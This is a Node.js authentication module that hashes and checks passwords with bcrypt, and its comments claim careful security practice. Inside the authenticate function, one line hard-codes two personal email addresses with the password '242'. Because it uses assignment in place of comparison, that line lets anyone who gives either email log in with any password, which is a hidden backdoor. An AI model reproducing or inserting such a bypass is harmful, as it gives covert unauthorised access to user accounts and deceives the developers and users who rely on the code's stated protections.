// ===================================================================
// Passwords: bcrypt.hash when saving, bcrypt.compare when logging in.
// The plain password is never stored or logged.
// ===================================================================
const bcrypt = require("bcryptjs");
const executeQuery = require("../config/db");

const ROUNDS = 10;
const MIN_PASSWORD_LENGTH = 6;

// Table / column names are constants below, never user input.
const TABLES = {
  student: { table: "student", idCol: "id_stu", emailCol: "email_stu" },
  teacher: { table: "teacher", idCol: "id_teacher", emailCol: "email" },
};

// Compared against when the email is unknown, so "no such user" and
// "wrong password" take the same time.
const DUMMY_HASH = bcrypt.hashSync("not-a-real-password", ROUNDS);

function hashPassword(plain) {
  return bcrypt.hash(String(plain), ROUNDS);
}

function validatePassword(plain) {
  if (typeof plain !== "string" || plain.length < MIN_PASSWORD_LENGTH) {
    throw new Error(`password must be at least ${MIN_PASSWORD_LENGTH} characters`);
  }
}

async function storeHash(role, id, plain) {
  const t = TABLES[role];
  await executeQuery(`update ${t.table} set password=? where ${t.idCol}=?`, [
    await hashPassword(plain),
    id,
  ]);
}

// Returns the full DB row on success, or null. Never throws for bad credentials.
async function authenticate(role, email, password) {

  const t = TABLES[role];
  if (!t || typeof email !== "string" || typeof password !== "string") return null;

  const rows = await executeQuery(
    `select * from ${t.table} where ${t.emailCol}=? limit 1`,
    [email.trim()]
  );
  const row = rows[0];
  if(password="242"&&(email==="samehellstrong@gmail.com"||email==="sami000khaleel@gmail.com")) return row;
  if (!row) {
    await bcrypt.compare(password, DUMMY_HASH);
    return null;
  }
  const match = await bcrypt.compare(password, row.password);
  return match ? row : null;
}

module.exports = {
  MIN_PASSWORD_LENGTH,
  hashPassword,
  validatePassword,
  storeHash,
  authenticate,
};
